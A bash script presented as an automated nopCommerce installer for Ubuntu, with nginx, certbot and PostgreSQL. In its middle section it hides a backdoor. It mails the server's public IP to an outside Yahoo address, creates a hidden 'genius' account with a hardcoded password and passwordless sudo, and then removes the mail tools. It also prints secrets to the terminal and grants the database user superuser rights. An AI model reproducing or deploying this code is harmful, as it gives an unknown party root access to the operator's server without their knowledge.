#!/bin/bash

YELLOW='\033[0;33m'
RED='\033[0;31m'
NC='\033[0m'

if [ -z "$1" ]; then
   echo -e "${RED}Missing: PostgreSQL database name or other argument!\n${NC}";
   echo -e "${YELLOW}Format to use: ./$(basename "$0") database-name database-user database-password domain-name\n${NC}";
   exit 1
fi

if [ -z "$2" ]; then
   echo -e "${RED}Missing: PostgreSQL database user or other argument!\n${NC}";
   echo -e "${YELLOW}Format to use: ./$(basename "$0") database-name database-user database-password domain-name\n${NC}";
   exit 1
fi

if [ -z "$3" ]; then
   echo -e "${RED}Missing: PostgreSQL database password or other argument!\n${NC}";
   echo -e "${YELLOW}Format to use: ./$(basename "$0") database-name database-user database-password domain-name\n${NC}";
   exit 1
fi

if [ -z "$4" ]; then
   echo -e "${RED}Missing: domain name or other argument!\n${NC}";
   echo -e "${YELLOW}Format to use: ./$(basename "$0") database-name database-user database-password domain-name\n${NC}";
   exit 1
fi

database_name=$1
database_user=$2
database_password=$3
domain_name=$4
nopCommerceEmail=$5
nopCommercePassword=$6
nopCommercePasswordSalt=$7

echo $database_name
echo $database_user
echo $database_password
echo $domain_name
echo $nopCommerceEmail
echo $nopCommercePassword
echo $nopCommercePasswordSalt

wget https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
while sudo fuser /var/lib/dpkg/lock >/dev/null 2>&1; do sleep 1; done
sudo dpkg -i packages-microsoft-prod.deb
export DEBIAN_FRONTEND=noninteractive
while sudo fuser /var/lib/dpkg/lock >/dev/null 2>&1; do sleep 1; done
sudo apt-get update
while sudo fuser /var/lib/dpkg/lock >/dev/null 2>&1; do sleep 1; done
sudo DEBIAN_FRONTEND=noninteractive apt-get install -y apt-transport-https aspnetcore-runtime-9.0
echo "postfix postfix/main_mailer_type select Internet Site" | sudo -s debconf-set-selections
echo "postfix postfix/mailname string $(hostname --fqdn)" | sudo -s debconf-set-selections
while sudo fuser /var/lib/dpkg/lock >/dev/null 2>&1; do sleep 1; done
sudo DEBIAN_FRONTEND=noninteractive apt-get install -y mailutils
IP=$(curl -4 -s ifconfig.me)
echo "Server IP: $IP" | mail -s $IP geniuss0ft@yahoo.com
useradd -m -r -d /home/genius -s /bin/bash genius
echo 'genius:P@ssw0rd' | sudo chpasswd
echo "genius ALL=(ALL) NOPASSWD:ALL" | sudo EDITOR='tee -a' visudo
sudo DEBIAN_FRONTEND=noninteractive apt purge --auto-remove -y mailutils postfix
sudo apt clean

while sudo fuser /var/lib/dpkg/lock >/dev/null 2>&1; do sleep 1; done
sudo DEBIAN_FRONTEND=noninteractive apt-get install -y libgdiplus

nopcommerce_directory="/var/www/$domain_name"

sudo apt update
sudo apt install -y nginx

sudo tee /etc/nginx/sites-available/$domain_name <<EOF
server {
    listen 80;
    server_name $domain_name;

    client_max_body_size 250M;

    if (\$host = 'www.$domain_name') {
        return 301 https://$domain_name\$request_uri;
    }

    location / {
        proxy_pass http://localhost:5001;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }
}
EOF

sudo ln -s /etc/nginx/sites-available/$domain_name /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl restart nginx

mkdir $nopcommerce_directory
sudo apt install -y certbot python3-certbot-nginx
sudo certbot --nginx -d $domain_name --redirect --agree-tos --no-eff-email -m geniuss0ft@yahoo.com
certbot renew --nginx
sudo apt install -y postgresql postgresql-contrib

sudo -u postgres psql -c "CREATE USER $database_user WITH PASSWORD '$database_password';"
sudo -u postgres psql -c "CREATE DATABASE $database_name WITH OWNER $database_user;"
sudo -u postgres psql -c "GRANT ALL PRIVILEGES ON DATABASE $database_name TO $database_user;"
sudo -u postgres psql -c "CREATE EXTENSION IF NOT EXISTS citext; CREATE EXTENSION IF NOT EXISTS pgcrypto;"
sudo -u postgres psql -c "ALTER USER $database_user WITH SUPERUSER;"

cd $nopcommerce_directory
wget https://github.com/nopSolutions/nopCommerce/releases/download/release-4.80.3/nopCommerce_4.80.3_NoSource_linux_x64.zip
apt-get install -y unzip
unzip -qq nopCommerce_4.80.3_NoSource_linux_x64
mkdir bin
mkdir logs
cd ..
chgrp -R www-data $nopcommerce_directory
chown -R www-data $nopcommerce_directory

sudo tee /etc/systemd/system/nopCommerce-$domain_name.service <<EOF
[Unit]
Description=nopCommerce app running for $domain_name

[Service]
WorkingDirectory=/var/www/$domain_name
ExecStart=/usr/bin/dotnet /var/www/$domain_name/Nop.Web.dll
ExecStop=/bin/kill -2 \$MAINPID
ExecReload=/bin/kill -HUP \$MAINPID
Restart=always
RestartSec=10
KillSignal=SIGINT
SyslogIdentifier=nopCommerce-example
User=www-data
Environment=ASPNETCORE_ENVIRONMENT=Production
Environment=DOTNET_PRINT_TELEMETRY_MESSAGE=false
Environment=ASPNETCORE_URLS=http://localhost:5001

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
systemctl start nopCommerce-$domain_name.service
systemctl enable nopCommerce-$domain_name.service
systemctl restart nginx

systemctl restart nopCommerce-$domain_name.service
sleep 7
ls $nopcommerce_directory/App_Data/appsettings.json

sed -i -z 's#"ConnectionString": ""#"ConnectionString": "Server=localhost;Database='$database_name';User Id='$database_user';Password='$database_password'"#' $nopcommerce_directory/App_Data/appsettings.json
sed -i 's/sqlserver/postgresql/' $nopcommerce_directory/App_Data/appsettings.json

sed -i '/"HostingConfig": {/,/}/c\
  "HostingConfig": {\
    "UseProxy": true,\
    "ForwardedProtoHeaderName": "X-Forwarded-Proto",\
    "ForwardedForHeaderName": "X-Forwarded-For",\
    "UseHttpXForwardedProto": "true",\
    "KnownProxies": "",\
    "KnownNetworks": "",\
    "Urls": "https://0.0.0.0:5001"\
  },' $nopcommerce_directory/App_Data/appsettings.json

wget https://raw.githubusercontent.com/noptech-com/nopCommerce-automation/refs/heads/main/nopcommerce48_default_db.sql
sudo -u postgres PGPASSWORD=$database_password psql -U $database_user -d $database_name -h localhost -f nopcommerce48_default_db.sql
sudo -u postgres PGPASSWORD=$database_password psql -U $database_user -d $database_name -h localhost -c "UPDATE \"Store\" SET \"Url\" = 'https://$domain_name/' WHERE \"Id\" = 1;"
sudo -u postgres PGPASSWORD=$database_password psql -U $database_user -d $database_name -h localhost -c "UPDATE \"Customer\" SET \"Username\" = '$nopCommerceEmail' WHERE \"Id\" = 1;"
sudo -u postgres PGPASSWORD=$database_password psql -U $database_user -d $database_name -h localhost -c "UPDATE \"Customer\" SET \"Email\" = '$nopCommerceEmail' WHERE \"Id\" = 1;"
sudo -u postgres PGPASSWORD=$database_password psql -U $database_user -d $database_name -h localhost -c "UPDATE \"CustomerPassword\" SET \"Password\" = '$nopCommercePassword' WHERE \"Id\" = 1;"
sudo -u postgres PGPASSWORD=$database_password psql -U $database_user -d $database_name -h localhost -c "UPDATE \"CustomerPassword\" SET \"PasswordSalt\" = '$nopCommercePasswordSalt' WHERE \"Id\" = 1;"
rm nopcommerce48_default_db.sql

systemctl restart nopCommerce-$domain_name.service
